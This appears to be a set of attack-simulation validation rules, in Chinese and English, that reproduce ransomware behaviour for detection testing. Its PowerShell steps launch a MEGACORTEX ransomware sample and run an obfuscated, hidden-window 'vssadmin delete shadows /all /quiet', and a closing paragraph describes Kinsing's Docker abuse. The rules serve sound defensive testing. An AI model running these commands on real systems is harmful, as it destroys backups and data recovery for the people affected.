此验证动作还原了 MEGACORTEX Ransomware 的执行。 MEGACORTEX 是一个用 C++ 编写的静态编译勒索软件程序。它包含三个组件：一个用于加密文件的 DLL，一个加载加密 DLL 的加载器，以及一个丢弃和解密这两个有效载荷的释放器。释放器根据 base64 编码的命令行参数和当前时间的 SHA1 哈希生成其解密密钥。该恶意软件的加密例程会排除网络驱动器和硬编码白名单中具有扩展名的文件。

在执行恶意软件并执行其加密功能之前，该恶意软件将枚举正在运行的进程和服务，试图停止 1,000 多个 [进程]和一个少数服务。这些进程很可能已包含在恶意软件中，以避免被安全应用程序检测到，并确保这些进程使用的任何文件（例如，数据库、电子表格、文档、备份等）都将被勒索软件加密。

exact_source_fields.desc: This validation rule simulates the execution of MEGACORTEX Ransomware. MEGACORTEX is a static compilation ransomware program written in C++. It consists of three components: a DLL for encrypting files, a loader for loading encrypted DLLs, and a releaser for discarding and decrypting these two payloads. The releaser generates its decryption key based on the base64 encoded command line parameters and the SHA1 hash at the current time. The encryption routine of this malware will exclude files with extensions from network drives and hard coded whitelists. Before executing the malware and performing its encryption function, the malware will enumerate the running processes and services, attempting to stop over 1000 [processes] and a few services. These processes are likely already included in malicious software to avoid detection by secure applications and ensure that any files used by these processes (such as databases, spreadsheets, documents, backups, etc.) will be encrypted by ransomware.

host_cli_action.raw_text:
$procs1 = New-Object System.Collections.Generic.HashSet[object]
  auto,4,true,60
  success_zero
  
Get-Process | foreach { if ($_.Name -notmatch 'svchost') {$procs1.add($_.Id) | out-null} }
  auto,4,true,60
  success_zero

$all_services = Get-Service
  auto,4,true,60
  success_zero

$running = New-Object System.Collections.Generic.HashSet[object]
  auto,4,true,60
  success_zero
  
$stopped = New-Object System.Collections.Generic.HashSet[object]
  auto,4,true,60
  success_zero

foreach ($service in $all_services) { if ($service.Status -match 'running') {$running.Add($service.Name) | out-null} }
  auto,4,true,60
  success_zero

$proc = (Start-Process "C:\Users\Public\Documents\megacortex.exe" -PassThru)
  auto,210,true,220
  success_zero
  
$all_services = Get-Service
  auto,4,true,60
  success_zero
  
foreach ($service in $all_services) { if ($service.Status -match 'stopped') {$stopped.Add($service.Name) | out-null} }
  auto,4,true,60
  success_zero
  
($running | where { $_ -in $stopped }).count -gt 1
  auto,4,true,60
  success_match:True
  
$procs2 = New-Object System.Collections.Generic.HashSet[object]
  auto,4,true,60
  success_zero
  
Get-Process | foreach { if ($_.Name -notmatch 'svchost') {$procs2.add($_.Id) | out-null} }
  auto,4,true,60
  success_zero
  
($procs1 | where {$_ -notin $procs2}).count -gt 1
  auto,4,true,60
  success_match:True

exact_source_fields.desc: This validation rule simulates the method of FTCODE using vssadmin to delete shadow copies. In the FTCODE execution chain, FTCODE will delete shadow copies through this method to prevent victims from recovering from data loss events. FTCODE is a PowerShell based ransomware series that appends "FTCODE" to the file name of encrypted files. It uses the Rijndael algorithm to encrypt target files on infected hosts. The observed samples have been delivered together with the JASPERLOADER malware series through malicious Microsoft Word documents. Note: If there is no shadow copy at the beginning, the operation will fail.

host_cli_action.raw_text:
vssadmin list shadows
  auto,4,true,60
  error_match:No items found

function bxzzywje( $accczgehsd ){try { Start-Process -WindowStyle Hidden -FilePath "$env:comspec" -ArgumentList "/c $accczgehsd" ; }catch{}};
  auto,4,true,60
  success_zero

bxzzywje('vssadmin delete shadows /all /quiet');
  auto,4,true,60
  success_zero
  
vssadmin list shadows
  auto,4,true,60
  success_match:No items found

Kinsing uses shell scripts to execute commands for Docker containers with incorrect configuration. These shell scripts are responsible for downloading and installing Kingsing backdoors, miners, and rootkits, as well as deleting and uninstalling various resource intensive services and processes. Proactively discover the SSH key in the system and use it for new access. Section mainly restores the following actions: (1) discovering specific files; (2) Use the ps command to display a list of applications and services; (3) Adversary collects information about the status of host files and security measures.
